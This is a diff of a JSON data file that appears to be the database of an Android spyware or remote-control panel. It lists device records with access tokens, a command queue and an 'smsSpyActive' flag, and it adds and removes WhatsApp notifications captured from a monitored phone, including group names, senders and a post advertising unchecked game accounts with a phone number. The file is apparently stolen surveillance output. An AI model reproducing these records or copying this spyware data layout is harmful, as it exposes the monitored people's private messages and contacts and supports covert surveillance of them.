@@ -6313,7 +6313,7 @@
     "deviceName": "HP-AUBREY-899E",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "3cfe8ffe8872f32822087d633ebd4fe4",
-    "lastSeen": 1776776958633,
+    "lastSeen": 1776776961719,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:49:26.839Z",
@@ -6329,6 +6329,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎GB ZUNZ PEKALONGAN (955 pesan): ~ MUNGZZ STORE",
+        "content": "TANYA ✅ OPEN UNCHEK FRESH✅\n\n\n🔰(FF)  (ML)  (FIFA)  (PUBG)🔰\n\nUNCHEK FRESH\n\n UNCHEK BIASA\n25  UNCHEK - 5k\n30  UNCHEK - 8K\n50  UNCHEK - 10K\n80  UNCHEK - 15K\n110  UNCHEK - 20K\n150  UNCHEK - 25K\n210  UNCHEK - 30K\n300  UNCHEK - 39K\n385  UNCHEK - 50K\n500  UNCHEK - 65K\n\n🔥JASTEB VVIP🔥\n- 50 JASTEB - 50K \n- 100 JASTEB - 100K\n- 125JASTEB - 125K\n- 160JASTEB - 150K\n____________________\n____________________\n SEMAKIN TINGGI NOMINAL SEMAKIN    BANYAK PELUANGNYA\n\n💳PAYMENT :\nGOPAY\nDANA \nQRIS\n \nADA PROMO SEPSIAL KHUSUS HARI INI🔥🔥\nWA: 085938382443",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776961848
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3515 pesan dari 21 chat",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776961792
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3514 pesan dari 21 chat",
+        "time": "21/04 20:09",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776776959712
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB ZUNZ PEKALONGAN (954 pesan): ~ ARDIZX STORE",
@@ -10304,30 +10328,6 @@
         "time": "21/04 19:39",
         "pkg": "com.whatsapp",
         "receivedAt": 1776775186892
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3686 pesan dari 23 chat",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775181259
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎GB byone/mabar ff 8a (74 pesan): diga",
-        "content": "Dhlh",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775181198
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎3685 pesan dari 23 chat",
-        "time": "21/04 19:39",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776775177022
       }
     ],
     "galleryPhotos": [],
@@ -16688,7 +16688,7 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776776958666,
+    "lastSeen": 1776776961659,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
